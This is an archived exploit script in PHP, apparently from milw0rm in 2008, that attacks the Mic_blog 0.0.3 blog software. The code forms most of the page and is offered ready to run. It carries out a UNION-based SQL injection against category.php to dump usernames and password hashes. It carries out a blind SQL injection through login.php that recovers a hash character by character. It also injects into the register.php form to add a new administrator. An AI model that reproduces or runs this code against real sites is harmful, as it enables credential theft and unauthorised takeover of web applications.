<html><head><title>Mic_blog 0.0.3 (SQL Injection/Privilege Escalation) Remote Exploit</title></head><pre>#!/usr/bin/php -q
&lt;?php

error_reporting(0);
ini_set(&quot;default_socket_timeout&quot;,5);



/*
   Mic_blog v0.0.3 Multiple Remote Exploit
   -------------------------------------------------------------
   Discovered By StAkeR aka athos - StAkeR[at]hotmail[dot]it
   Discovered On 16/10/2008
   http://miclen.xtreme-corp.net/file/source-mic_blog_v0.0.3-php.tar.gz
   -------------------------------------------------------------
   Exploit Coded By Me
   
   -1 Remote SQL Injection Exploit
   -2 Remote Blind SQL Injection Exploit
   -3 Remote Privilege Escalation Exploit (add a new administrator)
   
*/

function inj3ct_sql($conz,$blog,$prefix,$userid)
{
  $request = &quot;' union select 0,concat(0x616E6172636879&quot;.
             &quot;,username,0x3a,password,0x616E6172636879),0,0,0,0,0 from &quot;.
             $prefix .&quot; where id=&quot;.$userid.&quot;#&quot;;
                    
  $request = urlencode($request);
             
  if(!preg_match('/\w:[0-9]/i',$conz)) usage();   
  $host = explode(':',$conz);
  
  if(!$sock = fsockopen($host[0],$host[1])) die(&quot;Socket Error\r\n&quot;);

  $pack .= &quot;GET /$blog/category.php?cat=$request HTTP/1.1\r\n&quot;;
  $pack .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
  $pack .= &quot;Host: $host[0]\r\n&quot;;
  $pack .= &quot;Connection: close\r\n\r\n&quot;;
  
  fputs($sock,$pack);

  while(!feof($sock)) 
  {
    $inj3ct .= fgets($sock);
  } fclose($sock); 
  
  if(preg_match('/anarchy(.+?)anarchy/',$inj3ct,$zulp))
  { 
    $exp = explode(':',$zulp[1]);
    return $exp;
  }
}

function privilege($inet,$log,$nome,$pass)
{
             
  if(!preg_match('/\w:[0-9]/i',$inet)) usage();
  $real = explode(':',$inet);
  
  if(!$sok = fsockopen($real[0],$real[1])) die(&quot;Socket Error\r\n&quot;);
  
  $send = 'user='.$nome.'&amp;pass='.$pass.'&amp;pass2='.$pass.'&amp;'.
          'email=subviolence@none.com&amp;email2=subviolence'.
          '@none.com&amp;mese=4&amp;giorno=3&amp;anno=1993&amp;site=http:'.
          '//google.it '.&quot;','2','a')&quot;.'#&amp;news=si&amp;click=R';
          
  $pak .= &quot;POST /$log/register.php?reg= HTTP/1.1\r\n&quot;;
  $pak .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
  $pak .= &quot;Host: $host[0]\r\n&quot;;
  $pak .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  $pak .= &quot;Content-Length: &quot;.strlen($send).&quot;\r\n&quot;;
  $pak .= &quot;Connection: close\r\n\r\n&quot;;
  $pak .= $send;
  
  fputs($sok,$pak);

  while(!feof($sok)) 
  {
    $downme .= fgets($sok);
  } fclose($sok); 
  
  if(preg_match('/utente aggiunto/i',$downme))
  {
    return true;
  }
  else
  {
    return false;
  }
}


if($argv[5] == &quot;normal&quot;) 
{
  $normal = inj3ct_sql($argv[1],$argv[2],$argv[3],$argv[4]);
  
  if(isset($normal[0]))
  {
    echo &quot;[?] Password: $normal[1]\r\n&quot;;
    echo &quot;[?] Username: $normal[0]\r\n&quot;;
    die;
  }
  else
  {
    echo &quot;[?] Exploit Failed!\r\n&quot;;
    die;
  }
}
 
if($argv[5] == &quot;privilege&quot;)
{
  if(privilege($argv[1],$argv[2],$argv[3],$argv[4]))
  {
    echo &quot;[?] Added New Administrator\r\n&quot;;
    echo &quot;[?] Username: $argv[3]\r\n&quot;;
    echo &quot;[?] Password: $argv[4]\r\n&quot;;
    die;
  }
  else
  {
    echo &quot;[?] Exploit Failed!\r\n&quot;;
    die;
  }
}
 
 
function http_request($conn,$path,$post) 
{
  if(!preg_match('/\w:[0-9]/i',$conn)) usage();
  $addr = explode(':',$conn);
  
  $data = &quot;POST /$path/login.php HTTP/1.1\r\n&quot;.  
          &quot;Host: $addr[0]\r\n&quot;.
          &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;.
          &quot;Accept-Encoding: text/plain\r\n&quot;.
          &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
          &quot;Content-Length: &quot;.strlen($post).&quot;\r\n&quot;.
          &quot;Connection: close\r\n\r\n&quot;.
          $post;
          
                            
  if(!$sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP)) die(&quot;socket_create() error!\r\n&quot;);
  if(!socket_set_option($sock,SOL_SOCKET,SO_BROADCAST,1)) die(&quot;socket_set_option() error!\r\n&quot;); 
  if(!socket_connect($sock,$addr[0],(int)$addr[1])) die(&quot;socket_connect() error!\r\n&quot;);
  if(!socket_write($sock,$data,strlen($data))) die(&quot;socket_write() errror!\r\n&quot;);
  
  while($get = socket_read($sock,1024,PHP_NORMAL_READ)) 
  { 
    $content .= $get; 
  }

  socket_close($sock);
  
  $array = array(
               'HTTP/1.1 404 Not Found',
               'HTTP/1.1 300 Multiple Choices',
               'HTTP/1.1 301 Moved Permanently',
               'HTTP/1.1 302 Found',
               'HTTP/1.1 304 Not Modified',
               'HTTP/1.1 400 Bad Request',
               'HTTP/1.1 401 Unauthorized',
               'HTTP/1.1 402 Payment Required',
               'HTTP/1.1 403 Forbidden',
               'HTTP/1.1 405 Method Not Allowed',
               'HTTP/1.1 406 Not Acceptable',
               'HTTP/1.1 407 Proxy Authentication Required',
               'HTTP/1.1 408 Request Timeout',
               'HTTP/1.1 409 Conflict',
               'HTTP/1.1 410 Gone',
               'HTTP/1.1 411 Length Required',
               'HTTP/1.1 412 Precondition Failed',
               'HTTP/1.1 413 Request Entity Too Large',
               'HTTP/1.1 414 Request-URI Too Long',
               'HTTP/1.1 415 Unsupported Media Type',
               'HTTP/1.1 416 Request Range Not Satisfiable',
               'HTTP/1.1 417 Expectation Failed',
               'HTTP/1.1 Retry With',
              );
               
  for($i=0;$i&lt;=count($array);$i++)
  
  if(eregi($array[$i],$content)) 
  {
    return (&quot;$array[$i]\r\n&quot;);
    break;
  } 
  else 
  {
    return (&quot;$content\r\n&quot;);
    break;
  }
}


function char($char,$uid,$table,$idz)
{
  return &quot;user=' or ascii(substring((select password from $table where id=$idz),$uid,1))=$char#&amp;pass=aaaaaaaa&amp;click=Login&quot;;
}  
 
function usage()
{
  echo &quot;[?] mic blog v0.0.3 Multiple Remote Exploit\r\n\r\n&quot;;
  echo &quot;[?] (Remote\Blind) SQL Injection\r\n&quot;;
  echo &quot;[?] Usage: php [exploit.php] [host:port] [path blog] [table prefix_user] [user id] [normal or blind]\r\n&quot;;
  echo &quot;[?] Example: php mic.php localhost:80 cms mic_user 1 normal\r\n&quot;;
  echo &quot;[?] Example: php mic.php localhost:80 cms mic_user 1 blind\r\n\r\n&quot;;
  echo &quot;[?] Remote Privilege Escalation\r\n&quot;;
  echo &quot;[?] Usage: php mic.php localhost:80 cms [username] [password] [privilege]\r\n&quot;;
  echo &quot;[?] Example: php mic.php localhost:80 cms anarchy mypasswordz privilege\r\n&quot;;
  
  die;
}
 

$id = 0;
$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);


for($i=0;$i&lt;=32;$i++)
{
  for($j=0;$j&lt;=17;$j++)
  {
    if(!eregi('modules.php',http_request($argv[1],$argv[2],char($hash[$j],$id,$argv[3],$argv[4]))))
    {
      $password .= chr($hash[$j]);
      $id++;
    }
  }
}

if(isset($password))
{
  echo &quot;[?] Hash: $password\r\n[?] ID: $argv[4]\r\n&quot;;
  die;
}
else
{
  echo &quot;[?] Exploit Failed!\r\n&quot;;
  die;
}


?&gt;

# milw0rm.com [2008-10-16]</pre></html>